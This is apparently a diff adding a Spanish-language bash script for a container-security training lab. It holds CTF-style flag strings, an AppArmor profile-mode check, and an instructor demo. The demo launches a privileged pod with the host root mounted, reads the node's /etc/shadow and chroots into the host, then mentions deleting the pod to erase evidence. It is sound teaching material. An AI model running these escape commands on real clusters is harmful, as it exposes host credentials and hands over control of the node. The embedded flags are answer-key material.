@@ -1,0 +1,23 @@
+#!/bin/bash
+LAB=/root/lab5
+PERFIL=/etc/apparmor.d/opt.condor.leer-config
+APP=/opt/condor/leer-config
+B_A1="CT{l5-a-min-4e7b2a}"; B_A2="CT{l5-a-com-91d3f6}"; B_A3="CT{l5-a-ext-c58a17}"; B_AR="CT{l5-a-res-2b6e90}"
+B_B1="CT{l5-b-min-7a3c1d}"; B_B2="CT{l5-b-com-e24f88}"; B_B3="CT{l5-b-ext-5d9b3c}"; B_BR="CT{l5-b-res-a71e42}"
+verde(){ printf '\033[32m%s\033[0m\n' "$*"; }
+rojo(){ printf '\033[31m%s\033[0m\n' "$*"; }
+amar(){ printf '\033[33m%s\033[0m\n' "$*"; }
+guardar(){ grep -q "$2" $LAB/.banderas 2>/dev/null || echo "$1 $2" >> $LAB/.banderas; }
+modo_perfil(){ # imprime complain | enforce | ninguno
+  if aa-status 2>/dev/null | awk '/profiles are in enforce mode/{f=1;next} /profiles are in/{f=0} f' | grep -q 'opt/condor/leer-config'; then echo enforce
+  elif aa-status 2>/dev/null | awk '/profiles are in complain mode/{f=1;next} /profiles are in/{f=0} f' | grep -q 'opt/condor/leer-config'; then echo complain
+  else echo ninguno; fi; }
+
+# SOLO DOCENTE · Intro de la clase: «contener vs creer que se contiene»
+kubectl apply -f /root/lab5/espia.yaml >/dev/null && kubectl wait --for=condition=Ready pod/espia -n default --timeout=90s >/dev/null
+echo "# Un Pod cualquiera… pero lanzado con privileged: true y un hostPath a /"; echo
+echo '$ kubectl exec espia -- ls /host'; kubectl exec espia -- ls /host; echo
+echo '$ kubectl exec espia -- head -3 /host/etc/shadow'; kubectl exec espia -- head -3 /host/etc/shadow; echo
+echo '$ kubectl exec espia -- chroot /host id'; kubectl exec espia -- chroot /host id; echo
+amar "Eso es el disco del NODO, no del contenedor. El contenedor «contenía»… hasta que alguien escribió privileged: true."
+echo "(para borrar la evidencia: kubectl delete pod espia)"
